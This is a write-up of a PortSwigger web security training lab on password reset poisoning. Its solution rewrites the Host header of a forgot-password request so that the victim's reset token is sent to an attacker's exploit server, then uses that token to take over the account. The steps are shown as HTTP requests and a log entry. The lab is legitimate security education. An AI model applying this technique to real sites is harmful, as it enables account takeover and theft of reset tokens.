# [Lab: Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

## Lab

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

## Solutions

intercept the forgot password for `carlos` account:

```http
POST /forgot-password HTTP/1.1
Host: id.web-security-academy.net

csrf=RQr6byJSaljEYYHYKYAYbfAVmbidRpbc&username=carlos
```

modify the `Host` header:

```http
POST /forgot-password HTTP/1.1
Host: exploit-id.exploit-server.net

csrf=RQr6byJSaljEYYHYKYAYbfAVmbidRpbc&username=carlos
```

forward then check the log in the exploit-server:

```text
10.0.3.217      2023-02-06 09:36:58 +0000 "GET /forgot-password?temp-forgot-password-token=IjA38Dxt3OfsjkaM0NiatyrNwSsad0B0 HTTP/1.1"
```

access `/forgot-password` endpoint with the observed token to change Carlos's password, login => solved
